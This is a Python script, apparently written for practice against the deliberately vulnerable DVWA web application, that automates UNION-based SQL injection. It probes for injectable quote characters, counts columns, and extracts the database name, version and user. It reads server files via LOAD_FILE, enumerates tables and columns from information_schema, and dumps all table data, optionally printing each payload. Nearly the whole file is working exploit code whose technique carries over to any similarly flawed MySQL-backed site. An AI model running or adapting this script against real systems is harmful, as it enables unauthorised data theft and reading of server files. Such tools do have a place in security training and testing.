import requests, sys
from termcolor import *
from lxml import html
import base64
from urllib.parse import urlparse
import re
import argparse
import texttable as tt



sqli_chars = ["'","\"","`"]
chars = []
columns = []
database = []
cols = []
version = []
user = []
files = []
user_files = []
tables = []
extracted_tables = []
summary = {}
active = True



def printhosturl(url):
    parsed_uri = urlparse(url)
    result = "{uri.scheme}://{uri.netloc}/".format(uri=parsed_uri)
    cprint("Domain: " + result,"white",attrs=["bold"])
    cprint("Target URL: " + url,"white",attrs=["bold"])
    summary['target'] = [url]


def checkforsqli(url,cookies):
    for char in sqli_chars: 
        target = requests.get(url + char + "&Submit=Submit",cookies=cookies)
        response = target.text
        if 'You have an error in your SQL syntax' in response:
            cprint("SQL Syntax Error detected with character: " + char + "" ,"white")
            cprint(url + char + " is vulnerable to SQL Injection!\n","green",attrs=["bold"])
            chars.append(char)

def findcolumns(url,cookies):
    for char in chars:
        for num in range(1,50):
            count=1
            count+=1 
            known = (url + char + "UNION SELECT " + ",".join(str(no) for no in columns) + "-- -&Submit=Submit")
            target = requests.get(known,cookies=cookies)
            content_length = int(target.headers['Content-Length'])   
            if content_length > 200:
                cprint(str(count) + " columns have been have enumerated\n","green",attrs=["bold"])
                summary['Enumerated Columns'] = str(count)
                if args.payloadshow == True:
                    cprint("Payload to extract columns: " + known + "","yellow",attrs=["bold"])
                break    
            else:
                columns.append(num)

def retrievedatabase(url,cookies):
    for char in chars:
        print("Extracting the current database name!\n")
        database = columns[:]
        database[-1] = "database()"
        known = (url + char + "UNION SELECT " + ",".join(str(db) for db in database) + "-- -&Submit=Submit")
        target = requests.get(known,cookies=cookies)
        response = html.fromstring(target.content)
        database_info = response.xpath('//pre/text()')
        data = database_info[-1]
        if args.payloadshow == True:
            cprint("Payload to extract current database: " + known,"yellow",attrs=["bold"])
        cprint("Database name: " + data[9:] + "\n","green",attrs=["bold"])
        summary['database'] = [data[9:]]

def extractversion(url,cookies):
    for char in chars:
        print("Extracting the current version!\n")
        version = columns[:]
        version[-1] = "@@version"
        known = (url + char + "UNION SELECT " + ",".join(str(ver) for ver in version) + "-- -&Submit=Submit")
        target = requests.get(known,cookies=cookies)
        response = html.fromstring(target.content)
        version_info = response.xpath('//pre/text()')
        data = version_info[-1]
        if args.payloadshow == True:
            cprint("Payload to extract the database version: " + known,"yellow",attrs=["bold"])
        cprint("Database Version: " + data[9:] + "\n","green",attrs=["bold"])
        summary['version'] = [data[9:]]


def extractuser(url,cookies):
    for char in chars:
        print("Extracting the current user!\n")
        user = columns[:]
        user[-1] = "user()"
        known = (url + char + "UNION SELECT " + ",".join(str(use) for use in user) + "-- -&Submit=Submit")
        target = requests.get(known,cookies=cookies)
        response = html.fromstring(target.content)
        version_info = response.xpath('//pre/text()')
        data = version_info[-1]
        if args.payloadshow == True:
            cprint("Payload to extract the user the database is running as: " + known,"yellow",attrs=["bold"])
        cprint("Current User: " + data[9:] + "\n","green",attrs=["bold"])
        summary['current user'] = [data[9:]]


def loadfile(url,cookies):
    for char in chars:
        for userfile in user_files:
            print("Attempting to retrieve " + userfile + "!\n")
            files = columns[:]
            files[-1] = "concat(0x64723176656279,LOAD_FILE('" + userfile + "'),0x64723176656279)"
            re.data = re.compile(r"dr1veby(.*?)dr1veby", re.DOTALL)
            known = (url + char + "UNION SELECT " + ",".join(str(fil) for fil in files) + "-- -&Submit=Submit")
            target = requests.get(known,cookies=cookies)
            content = re.findall(re.data, target.text)
            if len(content) == 1:
                if args.payloadshow == True:
                    cprint("Payload to extract the " + userfile + " file: " + known,"yellow",attrs=["bold"])
                for cont in content:
                    cprint(cont,"green",attrs=["bold"])
                    summary['retrieved file'] = [userfile]
            else:
                cprint("Looks like we can't find that file!","red",attrs=["bold"])
                break
            
            
def extracttables(url,cookies):
    for char in chars:
            print("Extracting Tables from current database!\n")
            tables = columns[:]
            tables[-1] = "concat(0x64723176656279,table_name,0x64723176656279)"
            re.data = re.compile(r"dr1veby(.*?)dr1veby", re.DOTALL)
            known = (url + char + "UNION SELECT " + ",".join(str(tab) for tab in tables) + " FROM information_schema.tables WHERE table_schema=database()-- -&Submit=Submit")
            target = requests.get(known,cookies=cookies)
            response = html.fromstring(target.content)
            content = re.findall(re.data, target.text)
            if args.payloadshow == True:
                cprint("Payload to extract the table from the current database: " + known + "\n","yellow",attrs=["bold"])
            cprint("Database Tables: \n","white",attrs=["bold"])
            summ = []
            tab = tt.Texttable()
            headings = ["no","tables"]
            tab.header(headings)
            tabs = []
            nos = []
            count = 1
            for cont in content:
                nos.append(count)
                count +=1
                tabs.append(cont)
                summ.append(cont)
                summary['tables'] = summ
            for row in zip(nos,tabs):
                tab.add_row(row)
            s = tab.draw()
            cprint(s,"green",attrs=['bold'])

def extractcolumns(url,cookies):
    for char in chars:
        print("Extracting Columns from enumerated tables!\n")
        for table in summary['tables']:
            cols = columns[:]
            cols[-1] = "concat(0x64723176656279,column_name,0x64723176656279)"
            re.data = re.compile(r"dr1veby(.*?)dr1veby", re.DOTALL)
            known = (url + char + "UNION SELECT " + ",".join(str(co) for co in cols) + " FROM information_schema.columns WHERE table_name='" + table + "'-- -&Submit=Submit")
            target = requests.get(known,cookies=cookies)
            response = html.fromstring(target.content)
            content = re.findall(re.data, target.text)
            if args.payloadshow == True:
                cprint("\nPayload to extract the columns from "+ table + ": " + known + "\n","yellow",attrs=["bold"])
            cprint("Columns Enumerated from: " + table, "white",attrs=["bold"])
            summ = []
            tab = tt.Texttable()
            headings = ["no","tables"]
            tab.header(headings)
            tabs = []
            nos = []
            count = 1
            for cont in content:
                nos.append(count)
                count +=1
                tabs.append(cont)
                summ.append(cont)
                summary['columns for ' + table] = summ
            for row in zip(nos,tabs):
                tab.add_row(row)
            s = tab.draw()
            cprint(s,"green",attrs=['bold'])


def dumpdata(url,cookies):
    for char in chars:
        print("Lets dump some data!\n")
        for table in summary['tables']:
            for column in summary['columns for ' + table]:
                dumps = columns[:]
                dumps[-1] = "concat(0x64723176656279," + column + ",0x64723176656279)"
                re.data = re.compile(r"dr1veby(.*?)dr1veby", re.DOTALL)
                known = (url + char + "UNION SELECT " + ",".join(str(dump) for dump in dumps) + " FROM " + table + "-- -&Submit=Submit")
                target = requests.get(known,cookies=cookies)
                response = html.fromstring(target.content)
                content = re.findall(re.data, target.text)
                cprint("\nData dumped from column: '" + column + "' in: '" + table +"':\n","white",attrs=["bold"])
                summ = []
                tab = tt.Texttable()
                headings = ["no","data"]
                tab.header(headings)
                tabs = []
                nos = []
                count = 1
                for cont in content:
                    nos.append(count)
                    count +=1
                    tabs.append(cont)
                    summ.append(cont)
                    summary["Dumped data from column: " + "'" + column + "'" + " in table: " + "'" + table + "'"] = summ
                for row in zip(nos,tabs):
                    tab.add_row(row)
                s = tab.draw()
                cprint(s,"green",attrs=['bold'])



def printascii():
    asciiart = """
 _________________________________________
< DVWA Union Injection Auto Exploitation Script MOOOO! by @_dr1veby >
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\

                ||     ||
                """
    cprint(asciiart,"blue",attrs=["bold"])


###----------Script starts here--------------

cprint("DVWA Basic SQL Injection Exploitation Script","green",attrs=["bold"])
printascii()
parser = argparse.ArgumentParser("DVWA Auto SQLI Exploitation Script\n\nExample Syntax: dvwa_sqli_exploit.py http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=2 --cookie 5d09a14fa3cc2d42acd1fd4bbd430d8b --version\n")
parser.add_argument('url', help="Target URL in which to test")
parser.add_argument('--cookie', help="Set the PHPSESSID Value for the current DVWA session",required="True")
parser.add_argument('--version', help="Prints the version of the database software", action="store_true")
parser.add_argument('--database', help="Prints out the current database", action="store_true")
parser.add_argument('--loadfile', help="Attempts to retrieve a file from the server")
parser.add_argument('--tables', help="Extract tables from enumerated database", action="store_true")
parser.add_argument('--columns', help="Extract the columns from enumerated tables", action="store_true")
parser.add_argument('--user', help="Extracts the user the database is running as", action="store_true")
parser.add_argument('--dumpdata', help="Dumps the data from enumerated columns", action="store_true")
parser.add_argument('--payloadshow', help="Shows the payload used to extract the data",action="store_true")
args = parser.parse_args()

cookies = {}
cookies['security'] = "low"
cookies['PHPSESSID'] = args.cookie
url = args.url

if len(url) > 6:
    printhosturl(url+"\n")
    cprint("Checking if target url is vulnerable\n","yellow",attrs=["bold"])
    checkforsqli(url,cookies)
    cprint("Enumerating number of columns!\n","white",attrs=["bold"])
    findcolumns(url,cookies)
    if args.database == True:
        retrievedatabase(url,cookies)
    else:
        pass
    if args.version == True:
        extractversion(url,cookies)
    else:
        pass
    
    if args.user == True:
        extractuser(url,cookies)
    else:
        pass
    
    if args.loadfile is None:
        pass
    elif len(args.loadfile) >= 1:
        user_files.append(args.loadfile)
        loadfile(url,cookies)
    
    if args.tables == True:
        extracttables(url,cookies)
    else:
        pass

    if args.columns == True and args.tables == True:
        extractcolumns(url,cookies)
    elif args.columns == True:
        cprint("You must enumerate tables before you can enumerate columns! Re-run with --tables","red",attrs=['bold'])
    
    if args.dumpdata == True and args.columns == True and args.tables == True:
        dumpdata(url,cookies)
    elif args.dumpdata == True and args.columns == True:
        cprint("You must enumerate tables and columns before you can dump data! Re-run with --tables and --columns!","red",attrs=['bold'])
    elif args.dumpdata == True:
        cprint("You must enumerate tables and columns before you can dump data! Re-run with --tables and --columns!","red",attrs=['bold'])
else:
    cprint("Invalid URL!\nExiting!","red",attrs=['bold'])





